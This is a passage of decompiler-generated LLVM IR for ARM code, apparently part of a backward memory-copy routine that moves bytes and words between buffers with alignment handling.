  %v0_12220 = load i32, i32* %r2.global-to-local, align 4
  %v2_12220 = add i32 %v0_12220, -32
  store i32 %v2_12220, i32* %r2.global-to-local, align 4
  %v6_12224 = icmp slt i32 %v0_12220, 32
  br i1 %v6_12224, label %dec_label_pc_12228.loopexit, label %dec_label_pc_12210.dec_label_pc_12210_crit_edge

dec_label_pc_12210.dec_label_pc_12210_crit_edge:  ; preds = %dec_label_pc_12210
  %v0_12210.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12210

dec_label_pc_12228.loopexit:                      ; preds = %dec_label_pc_12210
  %v4_12220 = sub i32 31, %v0_12220
  %v5_12220 = and i32 %v4_12220, %v0_12220
  %v6_12220 = icmp slt i32 %v5_12220, 0
  %v7_12220 = icmp slt i32 %v2_12220, 0
  store i1 %v6_12220, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12220, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12228

dec_label_pc_12228:                               ; preds = %dec_label_pc_12228.loopexit, %dec_label_pc_12204
  %v6_12230 = phi i32 [ %v1_1221c, %dec_label_pc_12228.loopexit ], [ %v0_1221449, %dec_label_pc_12204 ]
  %v0_12238.pr = phi i32 [ %v2_12220, %dec_label_pc_12228.loopexit ], [ %v2_12208, %dec_label_pc_12204 ]
  %v4_12228 = add i32 %v0_12238.pr, 16
  %v6_12228 = sub i32 0, %v0_12238.pr
  %v7_12228 = and i32 %v4_12228, %v6_12228
  %v8_12228 = icmp slt i32 %v7_12228, 0
  store i1 %v8_12228, i1* %cpsr_v.global-to-local, align 1
  %v9_12228 = icmp slt i32 %v4_12228, 0
  store i1 %v9_12228, i1* %cpsr_n.global-to-local, align 1
  %v5_1222c = icmp slt i32 %v0_12238.pr, -16
  br i1 %v5_1222c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_12228
  %v6_1222c = load i32, i32* @r1, align 4
  %v7_1222c = add i32 %v6_1222c, -4
  %v8_1222c = inttoptr i32 %v7_1222c to i32*
  %v9_1222c = load i32, i32* %v8_1222c, align 4
  store i32 %v9_1222c, i32* %r3.global-to-local, align 4
  %v10_1222c = add i32 %v6_1222c, -8
  %v11_1222c = inttoptr i32 %v10_1222c to i32*
  %v12_1222c = load i32, i32* %v11_1222c, align 4
  store i32 %v12_1222c, i32* %r4.global-to-local, align 4
  %v13_1222c = add i32 %v6_1222c, -12
  %v14_1222c = inttoptr i32 %v13_1222c to i32*
  %v15_1222c = load i32, i32* %v14_1222c, align 4
  store i32 %v15_1222c, i32* @ip, align 4
  %v16_1222c = add i32 %v6_1222c, -16
  %v17_1222c = inttoptr i32 %v16_1222c to i32*
  %v18_1222c = load i32, i32* %v17_1222c, align 4
  store i32 %v18_1222c, i32* %lr.global-to-local, align 4
  store i32 %v16_1222c, i32* @r1, align 4
  %v7_12230 = add i32 %v6_12230, -16
  %v8_12230 = inttoptr i32 %v7_12230 to i32*
  store i32 %v9_1222c, i32* %v8_12230, align 4
  %v10_12230 = add i32 %v6_12230, -12
  %v11_12230 = inttoptr i32 %v10_12230 to i32*
  %v12_12230 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_12230, i32* %v11_12230, align 4
  %v13_12230 = add i32 %v6_12230, -8
  %v14_12230 = inttoptr i32 %v13_12230 to i32*
  %v15_12230 = load i32, i32* @ip, align 4
  store i32 %v15_12230, i32* %v14_12230, align 4
  %v16_12230 = add i32 %v6_12230, -4
  %v17_12230 = inttoptr i32 %v16_12230 to i32*
  %v18_12230 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_12230, i32* %v17_12230, align 4
  store i32 %v7_12230, i32* %r0.global-to-local, align 4
  %v6_12234 = load i32, i32* %r2.global-to-local, align 4
  %v7_12234 = add i32 %v6_12234, -16
  store i32 %v7_12234, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_12228, %bb140
  %v6_12240 = phi i32 [ %v7_12230, %bb140 ], [ %v6_12230, %dec_label_pc_12228 ]
  %v0_12238 = phi i32 [ %v7_12234, %bb140 ], [ %v0_12238.pr, %dec_label_pc_12228 ]
  %v4_12238 = add i32 %v0_12238, 20
  store i32 %v4_12238, i32* %r2.global-to-local, align 4
  %v6_12238 = sub i32 0, %v0_12238
  %v7_12238 = and i32 %v4_12238, %v6_12238
  %v8_12238 = icmp slt i32 %v7_12238, 0
  store i1 %v8_12238, i1* %cpsr_v.global-to-local, align 1
  %v9_12238 = icmp slt i32 %v4_12238, 0
  store i1 %v9_12238, i1* %cpsr_n.global-to-local, align 1
  %v5_1223c = icmp slt i32 %v0_12238, -20
  br i1 %v5_1223c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_1223c = load i32, i32* @r1, align 4
  %v7_1223c = add i32 %v6_1223c, -4
  %v8_1223c = inttoptr i32 %v7_1223c to i32*
  %v9_1223c = load i32, i32* %v8_1223c, align 4
  store i32 %v9_1223c, i32* %r3.global-to-local, align 4
  %v10_1223c = add i32 %v6_1223c, -8
  %v11_1223c = inttoptr i32 %v10_1223c to i32*
  %v12_1223c = load i32, i32* %v11_1223c, align 4
  store i32 %v12_1223c, i32* @ip, align 4
  %v13_1223c = add i32 %v6_1223c, -12
  %v14_1223c = inttoptr i32 %v13_1223c to i32*
  %v15_1223c = load i32, i32* %v14_1223c, align 4
  store i32 %v15_1223c, i32* %lr.global-to-local, align 4
  store i32 %v13_1223c, i32* @r1, align 4
  %v7_12240 = add i32 %v6_12240, -12
  %v8_12240 = inttoptr i32 %v7_12240 to i32*
  store i32 %v9_1223c, i32* %v8_12240, align 4
  %v10_12240 = add i32 %v6_12240, -8
  %v11_12240 = inttoptr i32 %v10_12240 to i32*
  %v12_12240 = load i32, i32* @ip, align 4
  store i32 %v12_12240, i32* %v11_12240, align 4
  %v13_12240 = add i32 %v6_12240, -4
  %v14_12240 = inttoptr i32 %v13_12240 to i32*
  %v15_12240 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_12240, i32* %v14_12240, align 4
  store i32 %v7_12240, i32* %r0.global-to-local, align 4
  %v6_12244 = load i32, i32* %r2.global-to-local, align 4
  %v7_12244 = add i32 %v6_12244, -12
  store i32 %v7_12244, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1226457 = phi i32 [ %v6_12240, %.thread14 ], [ %v7_12240, %bb141 ]
  %v0_1224c55 = phi i32 [ %v4_12238, %.thread14 ], [ %v7_12244, %bb141 ]
  %v2_12248 = load i8*, i8** %stack_var_-8, align 4
  %v3_12248 = ptrtoint i8* %v2_12248 to i32
  store i32 %v3_12248, i32* @r4, align 4
  store i32 %v8_12204, i32* @lr, align 4
  br label %dec_label_pc_1224c

dec_label_pc_1224c:                               ; preds = %dec_label_pc_121fc, %.thread16
  %v7_1225c = phi i32 [ %v0_1221449, %dec_label_pc_121fc ], [ %v6_1226457, %.thread16 ]
  %v0_1224c = phi i32 [ %v2_121fc, %dec_label_pc_121fc ], [ %v0_1224c55, %.thread16 ]
  %v2_1224c = add i32 %v0_1224c, 8
  store i32 %v2_1224c, i32* %r2.global-to-local, align 4
  %v4_1224c = sub i32 0, %v0_1224c
  %v5_1224c = and i32 %v2_1224c, %v4_1224c
  %v6_1224c = icmp slt i32 %v5_1224c, 0
  store i1 %v6_1224c, i1* %cpsr_v.global-to-local, align 1
  %v7_1224c = icmp slt i32 %v2_1224c, 0
  store i1 %v7_1224c, i1* %cpsr_n.global-to-local, align 1
  %v5_12250 = icmp slt i32 %v0_1224c, -8
  br i1 %v5_12250, label %bb143, label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %dec_label_pc_1224c
  %v6_12254 = add i32 %v0_1224c, 4
  store i32 %v6_12254, i32* %r2.global-to-local, align 4
  %v8_12254 = sub i32 -5, %v0_1224c
  %v9_12254 = and i32 %v8_12254, %v2_1224c
  %v10_12254 = icmp slt i32 %v9_12254, 0
  store i1 %v10_12254, i1* %cpsr_v.global-to-local, align 1
  %v11_12254 = icmp slt i32 %v6_12254, 0
  store i1 %v11_12254, i1* %cpsr_n.global-to-local, align 1
  %v5_12258 = icmp slt i32 %v2_1224c, 4
  %v6_12258 = load i32, i32* @r1, align 4
  %v7_12258 = add i32 %v6_12258, -4
  %v8_12258 = inttoptr i32 %v7_12258 to i32*
  %v9_12258 = load i32, i32* %v8_12258, align 4
  store i32 %v9_12258, i32* %r3.global-to-local, align 4
  br i1 %v5_12258, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_12254
  store i32 %v7_12258, i32* @r1, align 4
  %v8_1225c = add i32 %v7_1225c, -4
  %v9_1225c = inttoptr i32 %v8_1225c to i32*
  store i32 %v9_12258, i32* %v9_1225c, align 4
  %v10_1225c = load i32, i32* %r0.global-to-local, align 4
  %v11_1225c = add i32 %v10_1225c, -4
  store i32 %v11_1225c, i32* %r0.global-to-local, align 4
  %v0_1226c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_12254
  %v10_12260 = add i32 %v6_12258, -8
  %v11_12260 = inttoptr i32 %v10_12260 to i32*
  %v12_12260 = load i32, i32* %v11_12260, align 4
  store i32 %v12_12260, i32* @ip, align 4
  store i32 %v10_12260, i32* @r1, align 4
  %v7_12264 = add i32 %v7_1225c, -8
  %v8_12264 = inttoptr i32 %v7_12264 to i32*
  store i32 %v9_12258, i32* %v8_12264, align 4
  %v10_12264 = add i32 %v7_1225c, -4
  %v11_12264 = inttoptr i32 %v10_12264 to i32*
  %v12_12264 = load i32, i32* @ip, align 4
  store i32 %v12_12264, i32* %v11_12264, align 4
  store i32 %v7_12264, i32* %r0.global-to-local, align 4
  %v6_12268 = load i32, i32* %r2.global-to-local, align 4
  %v7_12268 = add i32 %v6_12268, -4
  store i32 %v7_12268, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_1224c, %dec_label_pc_121dc, %dec_label_pc_12410, %dec_label_pc_123a4, %dec_label_pc_12338, %bb142
  %v2_12270 = phi i32 [ %v11_1225c, %.thread20 ], [ %v0_1230832, %.thread26 ], [ %v7_1225c, %dec_label_pc_1224c ], [ %v2_121e0, %dec_label_pc_121dc ], [ %v2_1227c65, %dec_label_pc_12410 ], [ %v2_1227c64, %dec_label_pc_123a4 ], [ %v2_1227c63, %dec_label_pc_12338 ], [ %v7_12264, %bb142 ]
  %v0_1226c = phi i32 [ %v0_1226c.pre, %.thread20 ], [ %v2_122b0, %.thread26 ], [ %v2_1224c, %dec_label_pc_1224c ], [ %v2_121e4, %dec_label_pc_121dc ], [ %v0_1226c61, %dec_label_pc_12410 ], [ %v0_1226c60, %dec_label_pc_123a4 ], [ %v0_1226c59, %dec_label_pc_12338 ], [ %v7_12268, %bb142 ]
  %v1_1226c = add i32 %v0_1226c, 4
  store i32 %v1_1226c, i32* @r2, align 4
  %v3_1226c = sub i32 0, %v0_1226c
  %v4_1226c = and i32 %v1_1226c, %v3_1226c
  %v5_1226c = icmp slt i32 %v4_1226c, 0
  store i1 %v5_1226c, i1* %cpsr_v.global-to-local, align 1
  %v6_1226c = icmp slt i32 %v1_1226c, 0
  store i1 %v6_1226c, i1* %cpsr_n.global-to-local, align 1
  %v7_1226c = icmp eq i32 %v1_1226c, 0
  store i1 %v7_1226c, i1* @cpsr_z, align 1
  br i1 %v7_1226c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_12274 = add i32 %v0_1226c, 2
  %v3_12274 = sub i32 -3, %v0_1226c
  %v4_12274 = and i32 %v3_12274, %v1_1226c
  %v5_12274 = icmp slt i32 %v4_12274, 0
  store i1 %v5_12274, i1* %cpsr_v.global-to-local, align 1
  %v6_12274 = icmp slt i32 %v1_12274, 0
  store i1 %v6_12274, i1* %cpsr_n.global-to-local, align 1
  %v7_12274 = icmp eq i32 %v1_1226c, 2
  store i1 %v7_12274, i1* @cpsr_z, align 1
  %v0_12278 = load i32, i32* @r1, align 4
  %v1_12278 = add i32 %v0_12278, -1
  %v2_12278 = inttoptr i32 %v1_12278 to i8*
  %v3_12278 = load i8, i8* %v2_12278, align 1
  %v4_12278 = zext i8 %v3_12278 to i32
  store i32 %v4_12278, i32* %r3.global-to-local, align 4
  store i32 %v1_12278, i32* @r1, align 4
  %v3_1227c = add i32 %v2_12270, -1
  %v4_1227c = inttoptr i32 %v3_1227c to i8*
  store i8 %v3_12278, i8* %v4_1227c, align 1
  %v5_1227c = load i32, i32* %r0.global-to-local, align 4
  %v6_1227c = add i32 %v5_1227c, -1
  store i32 %v6_1227c, i32* %r0.global-to-local, align 4
  %v0_12280 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12280 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_12280 = xor i1 %v0_12280, %v1_12280
  br i1 %v2_12280, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_12280 = load i32, i32* @r1, align 4
  %v4_12280 = add i32 %v3_12280, -1
  %v5_12280 = inttoptr i32 %v4_12280 to i8*
  %v6_12280 = load i8, i8* %v5_12280, align 1
  %v7_12280 = zext i8 %v6_12280 to i32
  store i32 %v7_12280, i32* %r3.global-to-local, align 4
  store i32 %v4_12280, i32* @r1, align 4
  %v6_12284 = add i32 %v5_1227c, -2
  %v7_12284 = inttoptr i32 %v6_12284 to i8*
  store i8 %v6_12280, i8* %v7_12284, align 1
  %v8_12284 = load i32, i32* %r0.global-to-local, align 4
  %v9_12284 = add i32 %v8_12284, -1
  store i32 %v9_12284, i32* %r0.global-to-local, align 4
  %v1_12288.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12288.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1228c = phi i32 [ %v9_12284, %bb145 ], [ %v6_1227c, %bb144 ]
  %v2_1228c = phi i1 [ %v2_12288.pre, %bb145 ], [ %v1_12280, %bb144 ]
  %v1_1228c = phi i1 [ %v1_12288.pre, %bb145 ], [ %v0_12280, %bb144 ]
  %v0_12288 = load i1, i1* @cpsr_z, align 1
  %v3_12288 = xor i1 %v2_1228c, %v1_1228c
  %v4_12288 = or i1 %v0_12288, %v3_12288
  br i1 %v4_12288, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_12288 = load i32, i32* @r1, align 4
  %v6_12288 = add i32 %v5_12288, -1
  %v7_12288 = inttoptr i32 %v6_12288 to i8*
  %v8_12288 = load i8, i8* %v7_12288, align 1
  %v9_12288 = zext i8 %v8_12288 to i32
  store i32 %v9_12288, i32* %r3.global-to-local, align 4
  store i32 %v6_12288, i32* @r1, align 4
  %v8_1228c = add i32 %v7_1228c, -1
  %v9_1228c = inttoptr i32 %v8_1228c to i8*
  store i8 %v8_12288, i8* %v9_1228c, align 1
  %v10_1228c = load i32, i32* %r0.global-to-local, align 4
  %v11_1228c = add i32 %v10_1228c, -1
  store i32 %v11_1228c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_12294:                               ; preds = %dec_label_pc_121ec
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_12294 = icmp eq i32 %v1_121ec, 1
  store i1 %v8_12294, i1* %cpsr_n.global-to-local, align 1
  %v1_12298 = add i32 %v2_121dc, -1
  %v2_12298 = inttoptr i32 %v1_12298 to i8*
  %v3_12298 = load i8, i8* %v2_12298, align 1
  %v4_12298 = zext i8 %v3_12298 to i32
  store i32 %v4_12298, i32* %r3.global-to-local, align 4
  store i32 %v1_12298, i32* @r1, align 4
  %v3_1229c = add i32 %v2_121e0, -1
  %v4_1229c = inttoptr i32 %v3_1229c to i8*
  store i8 %v3_12298, i8* %v4_1229c, align 1
  %v5_1229c = load i32, i32* %r0.global-to-local, align 4
  %v6_1229c = add i32 %v5_1229c, -1
  store i32 %v6_1229c, i32* %r0.global-to-local, align 4
  br i1 %v8_12294, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_12294
  %v9_12294 = icmp eq i32 %v1_121ec, 2
  %v6_122a0 = load i32, i32* @r1, align 4
  %v7_122a0 = add i32 %v6_122a0, -1
  %v8_122a0 = inttoptr i32 %v7_122a0 to i8*
  %v9_122a0 = load i8, i8* %v8_122a0, align 1
  %v10_122a0 = zext i8 %v9_122a0 to i32
  store i32 %v10_122a0, i32* %r3.global-to-local, align 4
  store i32 %v7_122a0, i32* @r1, align 4
  %v9_122a4 = add i32 %v5_1229c, -2
  %v10_122a4 = inttoptr i32 %v9_122a4 to i8*
  store i8 %v9_122a0, i8* %v10_122a4, align 1
  %v11_122a4 = load i32, i32* %r0.global-to-local, align 4
  %v12_122a4 = add i32 %v11_122a4, -1
  store i32 %v12_122a4, i32* %r0.global-to-local, align 4
  br i1 %v9_12294, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_122a8 = load i32, i32* @r1, align 4
  %v9_122a8 = add i32 %v8_122a8, -1
  %v10_122a8 = inttoptr i32 %v9_122a8 to i8*
  %v11_122a8 = load i8, i8* %v10_122a8, align 1
  %v12_122a8 = zext i8 %v11_122a8 to i32
  store i32 %v12_122a8, i32* %r3.global-to-local, align 4
  store i32 %v9_122a8, i32* @r1, align 4
  %v11_122ac = add i32 %v11_122a4, -2
  %v12_122ac = inttoptr i32 %v11_122ac to i8*
  store i8 %v11_122a8, i8* %v12_122ac, align 1
  %v13_122ac = load i32, i32* %r0.global-to-local, align 4
  %v14_122ac = add i32 %v13_122ac, -1
  store i32 %v14_122ac, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_12294, %bb148
  %v0_1230832 = phi i32 [ %v12_122a4, %bb147 ], [ %v6_1229c, %dec_label_pc_12294 ], [ %v14_122ac, %bb148 ]
  %v0_122b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_122b0 = load i32, i32* @ip, align 4
  %v2_122b0 = sub i32 %v0_122b0, %v1_122b0
  store i32 %v2_122b0, i32* %r2.global-to-local, align 4
  %v4_122b0 = xor i32 %v1_122b0, %v0_122b0
  %v5_122b0 = xor i32 %v2_122b0, %v0_122b0
  %v6_122b0 = and i32 %v5_122b0, %v4_122b0
  %v7_122b0 = icmp slt i32 %v6_122b0, 0
  store i1 %v7_122b0, i1* %cpsr_v.global-to-local, align 1
  %v8_122b0 = icmp slt i32 %v2_122b0, 0
  store i1 %v8_122b0, i1* %cpsr_n.global-to-local, align 1
  %v5_122b4 = icmp slt i32 %v0_122b0, %v1_122b0
  br i1 %v5_122b4, label %bb143, label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %.thread26
  %v0_122b8 = load i32, i32* @r1, align 4
  %v1_122b8 = urem i32 %v0_122b8, 4
  store i32 %v1_122b8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_122b8 = icmp eq i32 %v1_122b8, 0
  br i1 %v2_122b8, label %dec_label_pc_121fc, label %dec_label_pc_122c0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_121f4, %dec_label_pc_122b8
  %v0_1230831 = phi i32 [ %v2_121e0, %dec_label_pc_121f4 ], [ %v0_1230832, %dec_label_pc_122b8 ]
  %v0_123b4 = phi i32 [ %v2_121e4, %dec_label_pc_121f4 ], [ %v2_122b0, %dec_label_pc_122b8 ]
  %v0_122c0 = phi i32 [ %v2_121dc, %dec_label_pc_121f4 ], [ %v0_122b8, %dec_label_pc_122b8 ]
  %v0_122c8 = phi i32 [ %v1_121f4, %dec_label_pc_121f4 ], [ %v1_122b8, %dec_label_pc_122b8 ]
  %v1_122c0 = and i32 %v0_122c0, -4
  store i32 %v1_122c0, i32* %r1.global-to-local, align 4
  %v1_122c4 = inttoptr i32 %v1_122c0 to i32*
  %v2_122c4 = load i32, i32* %v1_122c4, align 4
  store i32 %v2_122c4, i32* %r3.global-to-local, align 4
  %v7_122c8 = icmp ult i32 %v0_122c8, 2
  %v2_123ac = add i32 %v0_123b4, -12
  %v4_123ac = sub i32 11, %v0_123b4
  %v5_123ac = and i32 %v4_123ac, %v0_123b4
  %v6_123ac = icmp slt i32 %v5_123ac, 0
  store i1 %v6_123ac, i1* %cpsr_v.global-to-local, align 1
  %v7_123ac = icmp slt i32 %v2_123ac, 0
  store i1 %v7_123ac, i1* %cpsr_n.global-to-local, align 1
  %v5_123b0 = icmp slt i32 %v0_123b4, 12
  br i1 %v7_122c8, label %dec_label_pc_123ac, label %dec_label_pc_122d0

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122c0
  %v8_122c8 = icmp eq i32 %v0_122c8, 2
  br i1 %v8_122c8, label %dec_label_pc_12340, label %dec_label_pc_122d4

dec_label_pc_122d4:                               ; preds = %dec_label_pc_122d0
  br i1 %v5_123b0, label %dec_label_pc_12320, label %dec_label_pc_122dc

dec_label_pc_122dc:                               ; preds = %dec_label_pc_122d4
  store i32 %v2_123ac, i32* %r2.global-to-local, align 4
  %v3_122e0 = load i32, i32* @r4, align 4
  store i32 %v3_122e0, i32* %stack_var_-12, align 4
  %v6_122e0 = load i32, i32* @r5, align 4
  %v8_122e0 = inttoptr i32 %v6_122e0 to i8*
  store i8* %v8_122e0, i8** %stack_var_-8, align 4
  %v11_122e0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_122e4

dec_label_pc_122e4:                               ; preds = %dec_label_pc_122e4.dec_label_pc_122e4_crit_edge, %dec_label_pc_122dc
  %v0_12308 = phi i32 [ %v1_12308, %dec_label_pc_122e4.dec_label_pc_122e4_crit_edge ], [ %v0_1230831, %dec_label_pc_122dc ]
  %v0_122e8 = phi i32 [ %v0_122e8.pre, %dec_label_pc_122e4.dec_label_pc_122e4_crit_edge ], [ %v1_122c0, %dec_label_pc_122dc ]
  %v0_122e4 = phi i32 [ %v0_122e4.pre, %dec_label_pc_122e4.dec_label_pc_122e4_crit_edge ], [ %v2_122c4, %dec_label_pc_122dc ]
  %v3_122e4 = mul i32 %v0_122e4, 256
  store i32 %v3_122e4, i32* %lr.global-to-local, align 4
  %v1_122e8 = add i32 %v0_122e8, -4
  %v2_122e8 = inttoptr i32 %v1_122e8 to i32*
  %v3_122e8 = load i32, i32* %v2_122e8, align 4
  store i32 %v3_122e8, i32* %r3.global-to-local, align 4
  %v4_122e8 = add i32 %v0_122e8, -8
  %v5_122e8 = inttoptr i32 %v4_122e8 to i32*
  %v6_122e8 = load i32, i32* %v5_122e8, align 4
  store i32 %v6_122e8, i32* %r4.global-to-local, align 4
  %v7_122e8 = add i32 %v0_122e8, -12
  %v8_122e8 = inttoptr i32 %v7_122e8 to i32*
  %v9_122e8 = load i32, i32* %v8_122e8, align 4
  store i32 %v9_122e8, i32* %r5.global-to-local, align 4
  %v10_122e8 = add i32 %v0_122e8, -16
  %v11_122e8 = inttoptr i32 %v10_122e8 to i32*
  %v12_122e8 = load i32, i32* %v11_122e8, align 4
  store i32 %v10_122e8, i32* %r1.global-to-local, align 4
  %v4_122ec = udiv i32 %v12_122e8, 16777216
  %v5_122ec = or i32 %v4_122ec, %v3_122e4
  store i32 %v5_122ec, i32* %lr.global-to-local, align 4
  %v3_122f0 = mul i32 %v12_122e8, 256
  %v4_122f4 = udiv i32 %v9_122e8, 16777216
  %v5_122f4 = or i32 %v3_122f0, %v4_122f4
  store i32 %v5_122f4, i32* @ip, align 4
  %v3_122f8 = mul i32 %v9_122e8, 256
  %v4_122fc = udiv i32 %v6_122e8, 16777216
  %v5_122fc = or i32 %v3_122f8, %v4_122fc
  store i32 %v5_122fc, i32* %r5.global-to-local, align 4
  %v3_12300 = mul i32 %v6_122e8, 256
  %v4_12304 = udiv i32 %v3_122e8, 16777216
  %v5_12304 = or i32 %v3_12300, %v4_12304
  store i32 %v5_12304, i32* %r4.global-to-local, align 4
  %v1_12308 = add i32 %v0_12308, -16
  %v2_12308 = inttoptr i32 %v1_12308 to i32*
  store i32 %v5_12304, i32* %v2_12308, align 4
  %v4_12308 = add i32 %v0_12308, -12
  %v5_12308 = inttoptr i32 %v4_12308 to i32*
  %v6_12308 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12308, i32* %v5_12308, align 4
  %v7_12308 = add i32 %v0_12308, -8
  %v8_12308 = inttoptr i32 %v7_12308 to i32*
  %v9_12308 = load i32, i32* @ip, align 4
  store i32 %v9_12308, i32* %v8_12308, align 4
  %v10_12308 = add i32 %v0_12308, -4
  %v11_12308 = inttoptr i32 %v10_12308 to i32*
  %v12_12308 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12308, i32* %v11_12308, align 4
  store i32 %v1_12308, i32* %r0.global-to-local, align 4
  %v0_1230c = load i32, i32* %r2.global-to-local, align 4
  %v2_1230c = add i32 %v0_1230c, -16
  store i32 %v2_1230c, i32* %r2.global-to-local, align 4
  %v6_12310 = icmp slt i32 %v0_1230c, 16
  br i1 %v6_12310, label %dec_label_pc_12314, label %dec_label_pc_122e4.dec_label_pc_122e4_crit_edge

dec_label_pc_122e4.dec_label_pc_122e4_crit_edge:  ; preds = %dec_label_pc_122e4
  %v0_122e4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_122e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_122e4

dec_label_pc_12314:                               ; preds = %dec_label_pc_122e4
  %v2_12314 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12314, i32* @r4, align 4
  %v5_12314 = load i8*, i8** %stack_var_-8, align 4
  %v6_12314 = ptrtoint i8* %v5_12314 to i32
  store i32 %v6_12314, i32* @r5, align 4
  store i32 %v11_122e0, i32* @lr, align 4
  %v2_12318 = add i32 %v0_1230c, -4
  store i32 %v2_12318, i32* %r2.global-to-local, align 4
  %v4_12318 = add i32 %v0_1230c, 2147483632
  %v5_12318 = and i32 %v2_12318, %v4_12318
  %v6_12318 = icmp slt i32 %v5_12318, 0
  store i1 %v6_12318, i1* %cpsr_v.global-to-local, align 1
  %v7_12318 = icmp slt i32 %v2_12318, 0
  store i1 %v7_12318, i1* %cpsr_n.global-to-local, align 1
  %v5_1231c = icmp slt i32 %v2_1230c, -12
  br i1 %v5_1231c, label %dec_label_pc_12338, label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %dec_label_pc_12314, %dec_label_pc_122d4, %dec_label_pc_12320
  %v1_1232c = phi i32 [ %v5_1232c, %dec_label_pc_12320 ], [ %v1_12308, %dec_label_pc_12314 ], [ %v0_1230831, %dec_label_pc_122d4 ]
  %v0_12320 = load i32, i32* %r3.global-to-local, align 4
  %v3_12320 = mul i32 %v0_12320, 256
  store i32 %v3_12320, i32* %ip.global-to-local, align 4
  %v0_12324 = load i32, i32* %r1.global-to-local, align 4
  %v1_12324 = add i32 %v0_12324, -4
  %v2_12324 = inttoptr i32 %v1_12324 to i32*
  %v3_12324 = load i32, i32* %v2_12324, align 4
  store i32 %v3_12324, i32* %r3.global-to-local, align 4
  store i32 %v1_12324, i32* %r1.global-to-local, align 4
  %v4_12328 = udiv i32 %v3_12324, 16777216
  %v5_12328 = or i32 %v4_12328, %v3_12320
  store i32 %v5_12328, i32* @ip, align 4
  %v2_1232c = add i32 %v1_1232c, -4
  %v3_1232c = inttoptr i32 %v2_1232c to i32*
  store i32 %v5_12328, i32* %v3_1232c, align 4
  %v4_1232c = load i32, i32* %r0.global-to-local, align 4
  %v5_1232c = add i32 %v4_1232c, -4
  store i32 %v5_1232c, i32* %r0.global-to-local, align 4
  %v0_12330 = load i32, i32* %r2.global-to-local, align 4
  %v2_12330 = add i32 %v0_12330, -4
  store i32 %v2_12330, i32* %r2.global-to-local, align 4
  %v6_12334 = icmp slt i32 %v0_12330, 4
  br i1 %v6_12334, label %dec_label_pc_12338.loopexit, label %dec_label_pc_12320

dec_label_pc_12338.loopexit:                      ; preds = %dec_label_pc_12320
  %v4_12330 = sub i32 3, %v0_12330
  %v5_12330 = and i32 %v4_12330, %v0_12330
  %v6_12330 = icmp slt i32 %v5_12330, 0
  %v7_12330 = icmp slt i32 %v2_12330, 0
  store i1 %v6_12330, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12330, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %dec_label_pc_12338.loopexit, %dec_label_pc_12314
  %v2_1227c63 = phi i32 [ %v5_1232c, %dec_label_pc_12338.loopexit ], [ %v1_12308, %dec_label_pc_12314 ]
  %v0_1226c59 = phi i32 [ %v2_12330, %dec_label_pc_12338.loopexit ], [ %v2_12318, %dec_label_pc_12314 ]
  %v0_12338 = load i32, i32* %r1.global-to-local, align 4
  %v1_12338 = add i32 %v0_12338, 3
  store i32 %v1_12338, i32* @r1, align 4
  br label %bb143

dec_label_pc_12340:                               ; preds = %dec_label_pc_122d0
  br i1 %v5_123b0, label %dec_label_pc_1238c, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_12340
  store i32 %v2_123ac, i32* %r2.global-to-local, align 4
  %v3_1234c = load i32, i32* @r4, align 4
  store i32 %v3_1234c, i32* %stack_var_-12, align 4
  %v6_1234c = load i32, i32* @r5, align 4
  %v8_1234c = inttoptr i32 %v6_1234c to i8*
  store i8* %v8_1234c, i8** %stack_var_-8, align 4
  %v11_1234c = load i32, i32* @lr, align 4
  br label %dec_label_pc_12350

dec_label_pc_12350:                               ; preds = %dec_label_pc_12350.dec_label_pc_12350_crit_edge, %dec_label_pc_12348
  %v0_12374 = phi i32 [ %v1_12374, %dec_label_pc_12350.dec_label_pc_12350_crit_edge ], [ %v0_1230831, %dec_label_pc_12348 ]
